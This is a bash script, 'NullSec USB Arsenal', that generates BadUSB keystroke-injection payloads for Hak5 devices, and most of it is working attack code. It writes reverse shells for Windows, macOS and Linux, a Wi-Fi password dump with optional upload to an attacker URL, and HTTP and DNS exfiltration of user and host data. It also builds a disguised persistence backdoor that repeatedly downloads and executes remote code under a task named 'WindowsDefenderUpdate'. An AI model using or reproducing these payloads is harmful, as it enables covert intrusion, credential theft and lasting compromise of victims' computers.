#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec USB Arsenal
# BadUSB payload generator and deployment tool
#
# Compatible with Hak5 USB Rubber Ducky, O.MG Cable, and other HID devices
# Credits: Built for Hak5 Devices - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
PAYLOAD_DIR="/mmc/nullsec/usb-payloads"
OUTPUT_DIR="/mmc/nullsec/usb-compiled"
DATE_TAG=$(date +%Y%m%d_%H%M%S)

mkdir -p "$PAYLOAD_DIR" "$OUTPUT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║              NULLSEC USB ARSENAL v1.0                         ║
    ║                                                               ║
    ║      BadUSB Payload Generator & Deployment Tool               ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "    ${CYAN}Built for Hak5 USB Rubber Ducky & O.MG Cable${NC}"
    echo -e "    ${CYAN}https://hak5.org${NC}"
    echo ""
}

log() {
    local timestamp=$(date '+%H:%M:%S')
    echo -e "${GREEN}[$timestamp]${NC} $1"
}

# Generate Windows reverse shell payload
gen_win_revshell() {
    local lhost=$1
    local lport=$2
    local output="$OUTPUT_DIR/win_revshell_${DATE_TAG}.txt"
    
    log "Generating Windows reverse shell payload..."
    
    cat > "$output" << EOF
REM NullSec Windows Reverse Shell
REM Target: Windows 10/11
REM Requires: PowerShell
REM LHOST: $lhost LPORT: $lport

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000
STRING \$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate Windows WiFi password exfil
gen_win_wifi_exfil() {
    local exfil_url=${1:-""}
    local output="$OUTPUT_DIR/win_wifi_exfil_${DATE_TAG}.txt"
    
    log "Generating Windows WiFi exfiltration payload..."
    
    cat > "$output" << 'EOF'
REM NullSec WiFi Password Exfiltration
REM Target: Windows 10/11
REM Extracts all saved WiFi passwords

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }; $results = foreach ($p in $profiles) { $pass = (netsh wlan show profile name="$p" key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim(); "$p : $pass" }; $results | Out-File "$env:TEMP\wifi.txt"
ENTER
DELAY 2000
EOF

    if [ -n "$exfil_url" ]; then
        cat >> "$output" << EOF
STRING Invoke-WebRequest -Uri "$exfil_url" -Method POST -Body (Get-Content "\$env:TEMP\wifi.txt" -Raw)
ENTER
EOF
    fi

    cat >> "$output" << 'EOF'
STRING Remove-Item "$env:TEMP\wifi.txt" -Force
ENTER
STRING exit
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate Windows credential dump
gen_win_cred_dump() {
    local output="$OUTPUT_DIR/win_cred_dump_${DATE_TAG}.txt"
    
    log "Generating Windows credential dump payload..."
    
    cat > "$output" << 'EOF'
REM NullSec Credential Dump
REM Target: Windows 10/11
REM Dumps browser credentials and system info

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Get system info
STRING $info = @(); $info += "=== SYSTEM INFO ==="; $info += "Hostname: $env:COMPUTERNAME"; $info += "User: $env:USERNAME"; $info += "Domain: $env:USERDOMAIN"; $info += "OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)"; $info += "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress -join ', ')"; $info | Out-File "$env:TEMP\dump.txt"
ENTER
DELAY 500

REM Get WiFi profiles
STRING "`n=== WIFI PROFILES ===" | Out-File "$env:TEMP\dump.txt" -Append; netsh wlan show profiles | Out-File "$env:TEMP\dump.txt" -Append
ENTER
DELAY 500

REM Get recent documents
STRING "`n=== RECENT FILES ===" | Out-File "$env:TEMP\dump.txt" -Append; Get-ChildItem "$env:USERPROFILE\Recent" -ErrorAction SilentlyContinue | Select-Object Name | Out-File "$env:TEMP\dump.txt" -Append
ENTER
DELAY 500

REM Get installed software
STRING "`n=== INSTALLED SOFTWARE ===" | Out-File "$env:TEMP\dump.txt" -Append; Get-WmiObject Win32_Product | Select-Object Name, Version | Out-File "$env:TEMP\dump.txt" -Append
ENTER
DELAY 2000
STRING exit
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate macOS reverse shell
gen_mac_revshell() {
    local lhost=$1
    local lport=$2
    local output="$OUTPUT_DIR/mac_revshell_${DATE_TAG}.txt"
    
    log "Generating macOS reverse shell payload..."
    
    cat > "$output" << EOF
REM NullSec macOS Reverse Shell
REM Target: macOS
REM LHOST: $lhost LPORT: $lport

DELAY 1000
COMMAND SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/$lhost/$lport 0>&1 &
ENTER
DELAY 500
STRING exit
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate Linux reverse shell
gen_linux_revshell() {
    local lhost=$1
    local lport=$2
    local output="$OUTPUT_DIR/linux_revshell_${DATE_TAG}.txt"
    
    log "Generating Linux reverse shell payload..."
    
    cat > "$output" << EOF
REM NullSec Linux Reverse Shell
REM Target: Linux (GNOME/KDE)
REM LHOST: $lhost LPORT: $lport

DELAY 1000
CTRL ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/$lhost/$lport 0>&1 &
ENTER
DELAY 500
STRING exit
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate Windows backdoor installer
gen_win_persistence() {
    local callback_url=$1
    local output="$OUTPUT_DIR/win_persistence_${DATE_TAG}.txt"
    
    log "Generating Windows persistence payload..."
    
    cat > "$output" << EOF
REM NullSec Windows Persistence
REM Target: Windows 10/11
REM Creates scheduled task for persistence

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Create persistence script
STRING \$script = 'while(\$true){ try { IEX (New-Object Net.WebClient).DownloadString("$callback_url") } catch {} Start-Sleep -Seconds 300 }'; Set-Content -Path "\$env:APPDATA\svchost.ps1" -Value \$script
ENTER
DELAY 500

REM Create scheduled task
STRING schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell -w hidden -ep bypass -f '\$env:APPDATA\svchost.ps1'" /sc onlogon /rl highest /f
ENTER
DELAY 500
STRING exit
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate keyboard walk payload
gen_keyboard_walk() {
    local output="$OUTPUT_DIR/keyboard_walk_${DATE_TAG}.txt"
    
    log "Generating keyboard walk payload (credential test)..."
    
    cat > "$output" << 'EOF'
REM NullSec Keyboard Walk - Common Password Test
REM Tests if system accepts weak passwords via keyboard walking

DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 500

REM Common keyboard walks
STRING Testing common passwords:
ENTER
STRING qwerty
ENTER
STRING 123456
ENTER
STRING password
ENTER
STRING qwerty123
ENTER
STRING 1qaz2wsx
ENTER
STRING zxcvbnm
ENTER
STRING asdfghjkl
ENTER
STRING qazwsxedc
ENTER
EOF

    log "Payload saved to: $output"
    echo "$output"
}

# Generate data exfiltration payload
gen_data_exfil() {
    local exfil_method=${1:-"http"}
    local exfil_target=$2
    local output="$OUTPUT_DIR/data_exfil_${DATE_TAG}.txt"
    
    log "Generating data exfiltration payload..."
    
    case $exfil_method in
        http)
            cat > "$output" << EOF
REM NullSec Data Exfil (HTTP)
REM Target: Windows

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Collect and exfil
STRING \$data = @{}; \$data['hostname'] = \$env:COMPUTERNAME; \$data['user'] = \$env:USERNAME; \$data['ip'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {\$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress[0]; Invoke-WebRequest -Uri "$exfil_target" -Method POST -Body (\$data | ConvertTo-Json)
ENTER
STRING exit
ENTER
EOF
            ;;
        dns)
            cat > "$output" << EOF
REM NullSec Data Exfil (DNS)
REM Target: Windows

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM DNS exfil - encode data in subdomain
STRING \$data = \$env:USERNAME + "." + \$env:COMPUTERNAME; \$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\$data)).Replace("=","").Replace("+","-").Replace("/","_"); Resolve-DnsName -Name "\$encoded.$exfil_target" -ErrorAction SilentlyContinue
ENTER
STRING exit
ENTER
EOF
            ;;
    esac

    log "Payload saved to: $output"
    echo "$output"
}

# Create payload library
create_library() {
    log "Creating payload library..."
    
    mkdir -p "$PAYLOAD_DIR/windows" "$PAYLOAD_DIR/macos" "$PAYLOAD_DIR/linux" "$PAYLOAD_DIR/multi"
    
    # Windows payloads
    cat > "$PAYLOAD_DIR/windows/README.txt" << 'EOF'
NullSec USB Arsenal - Windows Payloads
======================================

Available payloads:
- revshell.txt     - Reverse shell (requires LHOST/LPORT)
- wifi_exfil.txt   - WiFi password extraction
- cred_dump.txt    - System information dump
- persistence.txt  - Scheduled task backdoor
- lockout.txt      - Account lockout tester

Credits: Built for Hak5 USB Rubber Ducky
https://hak5.org
EOF

    # macOS payloads
    cat > "$PAYLOAD_DIR/macos/README.txt" << 'EOF'
NullSec USB Arsenal - macOS Payloads
====================================

Available payloads:
- revshell.txt     - Reverse shell
- keychain.txt     - Keychain dumper
- ssh_keys.txt     - SSH key exfiltration

Credits: Built for Hak5 USB Rubber Ducky
https://hak5.org
EOF

    # Linux payloads
    cat > "$PAYLOAD_DIR/linux/README.txt" << 'EOF'
NullSec USB Arsenal - Linux Payloads
====================================

Available payloads:
- revshell.txt     - Reverse shell
- shadow.txt       - /etc/shadow exfil (requires root)
- ssh_backdoor.txt - SSH authorized_keys injection

Credits: Built for Hak5 USB Rubber Ducky
https://hak5.org
EOF

    log "Payload library created at: $PAYLOAD_DIR"
}

# Interactive generator
interactive() {
    banner
    
    echo "Select payload type:"
    echo ""
    echo "  Windows:"
    echo "    1) Reverse Shell"
    echo "    2) WiFi Password Exfiltration"
    echo "    3) Credential Dump"
    echo "    4) Persistence Backdoor"
    echo ""
    echo "  macOS:"
    echo "    5) Reverse Shell"
    echo ""
    echo "  Linux:"
    echo "    6) Reverse Shell"
    echo ""
    echo "  Multi-Platform:"
    echo "    7) Data Exfiltration (HTTP)"
    echo "    8) Data Exfiltration (DNS)"
    echo "    9) Keyboard Walk Test"
    echo ""
    echo "  Other:"
    echo "    10) Create Payload Library"
    echo "    11) List Generated Payloads"
    echo ""
    read -p "Choice [1-11]: " choice
    
    case $choice in
        1)
            read -p "LHOST (your IP): " lhost
            read -p "LPORT (your port): " lport
            gen_win_revshell "$lhost" "$lport"
            ;;
        2)
            read -p "Exfil URL (optional): " url
            gen_win_wifi_exfil "$url"
            ;;
        3) gen_win_cred_dump ;;
        4)
            read -p "Callback URL: " url
            gen_win_persistence "$url"
            ;;
        5)
            read -p "LHOST (your IP): " lhost
            read -p "LPORT (your port): " lport
            gen_mac_revshell "$lhost" "$lport"
            ;;
        6)
            read -p "LHOST (your IP): " lhost
            read -p "LPORT (your port): " lport
            gen_linux_revshell "$lhost" "$lport"
            ;;
        7)
            read -p "HTTP endpoint URL: " url
            gen_data_exfil "http" "$url"
            ;;
        8)
            read -p "DNS domain: " domain
            gen_data_exfil "dns" "$domain"
            ;;
        9) gen_keyboard_walk ;;
        10) create_library ;;
        11)
            echo ""
            echo "Generated payloads:"
            ls -la "$OUTPUT_DIR"/*.txt 2>/dev/null || echo "No payloads generated yet"
            ;;
        *) echo "Invalid choice" ;;
    esac
}

# Main
main() {
    case "$1" in
        --win-revshell)
            [ -z "$2" ] || [ -z "$3" ] && { echo "Usage: $0 --win-revshell LHOST LPORT"; exit 1; }
            gen_win_revshell "$2" "$3"
            ;;
        --win-wifi) gen_win_wifi_exfil "$2" ;;
        --win-creds) gen_win_cred_dump ;;
        --win-persist)
            [ -z "$2" ] && { echo "Usage: $0 --win-persist CALLBACK_URL"; exit 1; }
            gen_win_persistence "$2"
            ;;
        --mac-revshell)
            [ -z "$2" ] || [ -z "$3" ] && { echo "Usage: $0 --mac-revshell LHOST LPORT"; exit 1; }
            gen_mac_revshell "$2" "$3"
            ;;
        --linux-revshell)
            [ -z "$2" ] || [ -z "$3" ] && { echo "Usage: $0 --linux-revshell LHOST LPORT"; exit 1; }
            gen_linux_revshell "$2" "$3"
            ;;
        --library) create_library ;;
        -h|--help)
            banner
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --win-revshell LHOST LPORT    Windows reverse shell"
            echo "  --win-wifi [URL]              Windows WiFi exfil"
            echo "  --win-creds                   Windows credential dump"
            echo "  --win-persist URL             Windows persistence"
            echo "  --mac-revshell LHOST LPORT    macOS reverse shell"
            echo "  --linux-revshell LHOST LPORT  Linux reverse shell"
            echo "  --library                     Create payload library"
            echo "  -h, --help                    Show this help"
            echo ""
            ;;
        *) interactive ;;
    esac
}

main "$@"
